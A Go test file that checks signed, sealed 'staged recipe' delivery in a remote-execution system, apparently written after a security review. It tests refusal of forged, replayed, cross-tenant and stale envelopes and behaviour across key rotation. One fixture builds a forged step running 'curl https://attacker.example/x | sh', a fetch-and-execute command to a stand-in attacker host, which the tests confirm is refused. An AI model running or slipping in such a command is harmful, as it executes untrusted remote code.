package cook

// Sealed staged recipes (security review 2026-10-b, B1 and B9): farmer's
// real stageRecipe and pki.SealToSprout on one side, the sprout's real
// FetchStagedRecipe and SyncStagedRecipe on the other, with keys from a
// mock OpenBao (tenant) and the sprout's own files (setupSealedCook).
// Only the bytes GET /files/ answers with are stubbed (fetchFarmerFile):
// that is exactly what a compromised DMZ, which terminates the sprout's
// TLS, controls.

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/nacl/box"

	"github.com/yogzblr/imas/internal/config"
	"github.com/yogzblr/imas/internal/payloadbox"
	"github.com/yogzblr/imas/internal/pki"
)

type stagedPullEnv struct {
	*sealedCookEnv

	mu sync.Mutex
	// served, if set, is what GET /files/ answers instead of the
	// recipe store's copy.
	served []byte
	pulled []RecipeEnvelope // envelopes SyncStagedRecipe cooked
}

// setupSealedStaging is setupSealedCook (an enrolled web-01, its keys on
// both sides, answering sealed cooks) plus its own recipe store, its
// pinned sprout ID, and GET /files/ served from that store unless the
// test serves something else.
func setupSealedStaging(t *testing.T, tenant string) *stagedPullEnv {
	t.Helper()
	newStageTestStore(t)
	e := &stagedPullEnv{sealedCookEnv: setupSealedCook(t, tenant)}
	if err := os.WriteFile(pki.SproutIDFile(), []byte(e.sproutID), 0o644); err != nil {
		t.Fatal(err)
	}
	origAge := config.StagedRecipeMaxAge
	config.StagedRecipeMaxAge = 0 // the default, an hour
	origIdentity, origFetch, origCook, origStaged := stagedIdentity, fetchFarmerFile, cookPulled, fetchStaged
	t.Cleanup(func() {
		config.StagedRecipeMaxAge = origAge
		stagedIdentity, fetchFarmerFile, cookPulled, fetchStaged = origIdentity, origFetch, origCook, origStaged
	})
	fetchStaged = FetchStagedRecipe
	stagedIdentity = func(context.Context) (string, string, error) { return tenant, e.sproutID, nil }
	fetchFarmerFile = func(ctx context.Context, key string) ([]byte, error) {
		e.mu.Lock()
		served := e.served
		e.mu.Unlock()
		if served != nil {
			return served, nil
		}
		if ok, err := store.Exists(ctx, key); err != nil || !ok {
			return nil, fmt.Errorf("%w: %s", pki.ErrFarmerFileNotFound, key)
		}
		return store.Get(ctx, key)
	}
	cookPulled = func(env RecipeEnvelope) error {
		e.mu.Lock()
		defer e.mu.Unlock()
		e.pulled = append(e.pulled, env)
		return nil
	}
	return e
}

func (e *stagedPullEnv) serve(data []byte) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.served = data
}

func (e *stagedPullEnv) pulledJobs() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	var ids []string
	for _, env := range e.pulled {
		ids = append(ids, env.JobID)
	}
	return ids
}

// stagedBytes is what farmer staged for web-01.
func (e *stagedPullEnv) stagedBytes(t *testing.T) []byte {
	t.Helper()
	data, err := store.Get(context.Background(), mustStagedKey(t, e.tenant, e.sproutID))
	if err != nil {
		t.Fatal(err)
	}
	return data
}

// stage has farmer stage env for web-01, as SendCookEventContext does
// before it pushes; the push itself is left out, so the sprout missed it.
func (e *stagedPullEnv) stage(t *testing.T, env RecipeEnvelope) {
	t.Helper()
	if err := stageRecipe(context.Background(), e.tenant, e.sproutID, env); err != nil {
		t.Fatalf("stageRecipe: %v", err)
	}
}

func handledContains(t *testing.T, jobID string) bool {
	t.Helper()
	b, _ := os.ReadFile(config.SproutHandledJobsFile)
	return slices.Contains(strings.Fields(string(b)), jobID)
}

func forgedEnvelope() RecipeEnvelope {
	return RecipeEnvelope{
		JobID:        "forged-job",
		DispatchedAt: time.Now().UTC(),
		Steps: []Step{{
			ID: "pwn", Ingredient: "cmd", Method: "run",
			Properties: map[string]interface{}{"name": "curl https://attacker.example/x | sh"},
		}},
	}
}

func mustRefuse(t *testing.T, what string) {
	t.Helper()
	outcome, err := SyncStagedRecipe(t.Context(), SyncOnReconnect)
	if !errors.Is(err, ErrStagedRecipeUnverified) {
		t.Fatalf("%s: SyncStagedRecipe = %q, %v; want ErrStagedRecipeUnverified", what, outcome, err)
	}
}

// B1, the review's throwaway test, kept: GET /files/ answers with a
// RecipeEnvelope of the attacker's own, fresh DispatchedAt, a JobID the
// sprout never handled, one cmd.run step. Before the fix the outcome was
// "cooked" with the forged step passed to the cooker verbatim; now it is
// refused, nothing is cooked, and the forged job isn't recorded as
// handled (so it can't shadow a real one).
func TestStagedSealed_ForgedPlainEnvelopeIsRefused(t *testing.T) {
	e := setupSealedStaging(t, "t_staged_forged")
	forged, err := json.Marshal(forgedEnvelope())
	if err != nil {
		t.Fatal(err)
	}
	e.serve(forged)
	mustRefuse(t, "plain JSON envelope")
	if got := e.pulledJobs(); len(got) != 0 {
		t.Fatalf("forged staged recipe was cooked: %v", got)
	}
	if handledContains(t, "forged-job") {
		t.Error("forged job recorded as handled")
	}
}

// The forgeries a DMZ can make that look sealed: an envelope it sealed
// under a tenant keypair of its own to the sprout's real box key; one of
// farmer's sealed cook dispatches captured off the bus; garbage marked
// sealed. None opens as a staged recipe for this sprout.
func TestStagedSealed_ForgedSealedEnvelopesAreRefused(t *testing.T) {
	e := setupSealedStaging(t, "t_staged_forged_sealed")

	active, _, err := pki.ValidSproutBoxKeys(e.tenant, e.sproutID)
	if err != nil {
		t.Fatal(err)
	}
	sproutPub, err := pki.DecodeBoxPubKey(active)
	if err != nil {
		t.Fatal(err)
	}
	_, attackerPriv := genBoxKey(t)
	msg, err := payloadbox.NewMessage(payloadbox.PurposeStagedRecipe, e.tenant, e.sproutID, "", forgedEnvelope())
	if err != nil {
		t.Fatal(err)
	}
	ownKey, err := payloadbox.Seal(msg, []payloadbox.KeyPair{{PeerPub: sproutPub, Priv: attackerPriv}})
	if err != nil {
		t.Fatal(err)
	}
	dispatch, _, err := pki.SealToSprout(e.tenant, e.sproutID, payloadbox.PurposeCookRequest, "", forgedEnvelope())
	if err != nil {
		t.Fatal(err)
	}
	for name, data := range map[string][]byte{
		"sealed under the attacker's own tenant key": ownKey,
		"a captured sealed cook dispatch":            dispatch,
		"garbage":                                    []byte(`{"v":2,"s":[{"n":"AAAA","c":"AAAA"}]}`),
		"empty":                                      {},
	} {
		e.serve(data)
		mustRefuse(t, name)
	}
	if got := e.pulledJobs(); len(got) != 0 {
		t.Fatalf("a forged staged recipe was cooked: %v", got)
	}
	if handledContains(t, "forged-job") {
		t.Error("forged job recorded as handled")
	}
}

// A genuine staged copy for another sprout of the same tenant, or for
// the same sprout_id in another tenant, served at web-01's key: farmer
// sealed it, but not for this sprout, so it doesn't open here.
func TestStagedSealed_EnvelopeForAnotherSproutOrTenantIsRefused(t *testing.T) {
	e := setupSealedStaging(t, "t_staged_cross_a")
	const other = "t_staged_cross_b"
	pki.InvalidateTenantBoxKeys(other)
	t.Cleanup(func() { pki.InvalidateTenantBoxKeys(other) })
	for _, target := range [][2]string{{e.tenant, "web-02"}, {other, e.sproutID}} {
		pub, _ := genBoxKey(t)
		if err := pki.RotateSproutBoxKey(target[0], target[1], encodeBoxKey(pub), time.Hour); err != nil {
			t.Fatal(err)
		}
		if err := stageRecipe(context.Background(), target[0], target[1], RecipeEnvelope{JobID: "job-for-" + target[0] + "-" + target[1], DispatchedAt: time.Now().UTC()}); err != nil {
			t.Fatal(err)
		}
		data, err := store.Get(context.Background(), mustStagedKey(t, target[0], target[1]))
		if err != nil {
			t.Fatal(err)
		}
		e.serve(data)
		mustRefuse(t, target[0]+"/"+target[1]+"'s staged recipe")
	}

	// Defence in depth past the keys: sealed with web-01's own box key
	// and its tenant's key, but naming another sprout or tenant. The
	// sprout's pins refuse it.
	keys, err := pki.TenantBoxKeys(e.tenant)
	if err != nil {
		t.Fatal(err)
	}
	active, _, err := pki.ValidSproutBoxKeys(e.tenant, e.sproutID)
	if err != nil {
		t.Fatal(err)
	}
	sproutPub, err := pki.DecodeBoxPubKey(active)
	if err != nil {
		t.Fatal(err)
	}
	for _, names := range [][2]string{{e.tenant, "web-02"}, {other, e.sproutID}} {
		msg, err := payloadbox.NewMessage(payloadbox.PurposeStagedRecipe, names[0], names[1], "", forgedEnvelope())
		if err != nil {
			t.Fatal(err)
		}
		data, err := payloadbox.Seal(msg, []payloadbox.KeyPair{{PeerPub: sproutPub, Priv: keys[0].Priv}})
		if err != nil {
			t.Fatal(err)
		}
		e.serve(data)
		mustRefuse(t, "naming "+names[0]+"/"+names[1])
	}
	if got := e.pulledJobs(); len(got) != 0 {
		t.Fatalf("another sprout's staged recipe was cooked: %v", got)
	}
}

// The genuine case still works: the sprout misses a dispatch's push
// (offline), farmer's real SendCookEvent has staged it sealed, and the
// next pull opens and cooks exactly what farmer rendered, once.
func TestStagedSealed_GenuineMissedDispatchIsCooked(t *testing.T) {
	e := setupSealedStaging(t, "t_staged_genuine")
	e.sprout.Close() // offline: the push gets no responder
	jid := GenerateJobID()
	if err := SendCookEvent(e.tenant, e.sproutID, "first", jid, false, WithInvoker("UINVOKER")); err == nil {
		t.Fatal("SendCookEvent to an offline sprout succeeded")
	}
	if bytes.Contains(e.stagedBytes(t), []byte("echo first")) || bytes.Contains(e.stagedBytes(t), []byte(jid)) {
		t.Error("the staged copy is readable in plaintext")
	}

	mustSync(t, SyncCooked)
	e.mu.Lock()
	pulled := slices.Clone(e.pulled)
	e.mu.Unlock()
	if len(pulled) != 1 || pulled[0].JobID != jid || pulled[0].InvokedBy != "UINVOKER" ||
		len(pulled[0].Steps) != 1 || pulled[0].Steps[0].Properties["name"] != "echo first" {
		t.Fatalf("cooked %+v, want farmer's rendered dispatch %s", pulled, jid)
	}
	if time.Since(pulled[0].DispatchedAt) > time.Minute {
		t.Errorf("DispatchedAt = %v, want farmer's dispatch time", pulled[0].DispatchedAt)
	}
	mustSync(t, SyncAlreadyHandled)
	if got := e.pulledJobs(); len(got) != 1 {
		t.Errorf("cooked %v, want the job once", got)
	}
}

// B9 and replay: every freshness and replay decision is made on what is
// inside the verified envelope. A captured genuine envelope served again
// is already handled; one older than StagedRecipeMaxAge is too old; an
// older job the sprout never ran, captured while it was staged and
// served after the sprout handled a newer one, is superseded.
func TestStagedSealed_ReplayedOldEnvelopeIsRefused(t *testing.T) {
	e := setupSealedStaging(t, "t_staged_replay")

	e.stage(t, RecipeEnvelope{JobID: "job-1", DispatchedAt: time.Now().UTC()})
	captured1 := e.stagedBytes(t)
	mustSync(t, SyncCooked)
	e.serve(captured1)
	mustSync(t, SyncAlreadyHandled)

	// Genuine, but dispatched two hours ago.
	e.serve(nil)
	e.stage(t, RecipeEnvelope{JobID: "job-stale", DispatchedAt: time.Now().Add(-2 * time.Hour).UTC()})
	mustSync(t, SyncTooOld)

	// job-2 is staged; the DMZ, which holds the sprout's gateway JWT,
	// copies it. The sprout misses job-2's push but receives job-3's.
	// Served job-2 afterwards, it must not run it after job-3.
	e.stage(t, RecipeEnvelope{JobID: "job-2", DispatchedAt: time.Now().Add(-time.Second).UTC()})
	captured2 := e.stagedBytes(t)
	if err := SendStepsEvent(e.tenant, e.sproutID, "job-3", secretSteps()); err != nil {
		t.Fatalf("SendStepsEvent: %v", err)
	}
	e.serve(captured2)
	mustSync(t, SyncSuperseded)
	mustSync(t, SyncAlreadyHandled)

	if got := e.pulledJobs(); !slices.Equal(got, []string{"job-1"}) {
		t.Errorf("pulled and cooked %v, want only [job-1]", got)
	}
}

// Tenant key rotation. Farmer seals every staged copy under each tenant
// key in its grace set (pki.TenantBoxKeys: the current key and, inside a
// non-severing rotation's grace window, the previous one), so:
//   - written after a rotation, inside the grace window: it opens for a
//     sprout still pinned to the previous key and for one that re-pinned;
//   - written before a rotation, read by a sprout that has since re-pinned
//     (its refresh moved the pin): sealed under the old key only, it
//     doesn't open and is refused, never cooked; that missed job is lost
//     to the pull (it stays reported as not run) rather than trusted;
//   - written after a severing rotation: new key only, so a sprout still
//     pinned to the cut-off key refuses it (and must re-enroll anyway).
func TestStagedSealed_TenantKeyRotation(t *testing.T) {
	e := setupSealedStaging(t, "t_staged_rotate")
	oldPin, err := os.ReadFile(config.SproutTenantX25519PubFile)
	if err != nil {
		t.Fatal(err)
	}
	repin := func(t *testing.T, pub []byte) {
		t.Helper()
		if err := os.WriteFile(config.SproutTenantX25519PubFile, pub, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	at := time.Now().UTC()
	stageJob := func(jobID string) []byte {
		at = at.Add(time.Millisecond)
		e.stage(t, RecipeEnvelope{JobID: jobID, DispatchedAt: at})
		return e.stagedBytes(t)
	}

	before := stageJob("job-before-rotation")
	rot, err := pki.RotateTenantX25519Keypair(e.tenant, false)
	if err != nil {
		t.Fatal(err)
	}
	newPin := []byte(rot.Pub)

	// Written inside the grace window: one copy per key.
	stageJob("job-in-grace-old-pin")
	mustSync(t, SyncCooked)
	repin(t, newPin)
	stageJob("job-in-grace-new-pin")
	mustSync(t, SyncCooked)

	// Written before the rotation, pulled after re-pinning.
	e.serve(before)
	mustRefuse(t, "a copy sealed before the rotation, after re-pinning")
	e.serve(nil)

	// A severing rotation: the sprout, still on the cut-off pin, refuses.
	if _, err := pki.RotateTenantX25519Keypair(e.tenant, true); err != nil {
		t.Fatal(err)
	}
	stageJob("job-after-sever")
	mustRefuse(t, "a copy sealed after a severing rotation, under the cut-off pin")
	repin(t, oldPin)
	mustRefuse(t, "a copy sealed after a severing rotation, under the first pin")

	if got := e.pulledJobs(); !slices.Equal(got, []string{"job-in-grace-old-pin", "job-in-grace-new-pin"}) {
		t.Errorf("pulled and cooked %v", got)
	}
}

// No plaintext fallback on either side. Farmer stages nothing for a
// sprout with no box key on record, and removes what an earlier dispatch
// left; a sprout without keys refuses whatever it is served.
func TestStagedSealed_NoPlaintextForKeylessSprouts(t *testing.T) {
	newStageTestStore(t)
	ctx := context.Background()
	key := mustStagedKey(t, testTenantID, "pre-j-sprout")
	if err := store.Put(ctx, key, []byte(`{"JobID":"left-over"}`)); err != nil {
		t.Fatal(err)
	}
	if err := stageRecipe(ctx, testTenantID, "pre-j-sprout", RecipeEnvelope{JobID: "j", DispatchedAt: time.Now()}); err != nil {
		t.Fatalf("stageRecipe for a keyless sprout: %v", err)
	}
	if ok, err := store.Exists(ctx, key); err != nil || ok {
		t.Errorf("staged copy for a keyless sprout present (exists=%v, err=%v)", ok, err)
	}

	origPriv, origPin := config.SproutBoxPrivFile, config.SproutTenantX25519PubFile
	t.Cleanup(func() { config.SproutBoxPrivFile, config.SproutTenantX25519PubFile = origPriv, origPin })
	config.SproutBoxPrivFile, config.SproutTenantX25519PubFile = "", ""
	plain, _ := json.Marshal(forgedEnvelope())
	if _, err := openStagedRecipe(plain); !errors.Is(err, ErrStagedRecipeUnverified) {
		t.Errorf("a keyless sprout opened plain JSON: %v", err)
	}
}

func genBoxKey(t *testing.T) (pub, priv *[32]byte) {
	t.Helper()
	pub, priv, err := box.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	return pub, priv
}

func encodeBoxKey(pub *[32]byte) string { return base64.StdEncoding.EncodeToString(pub[:]) }
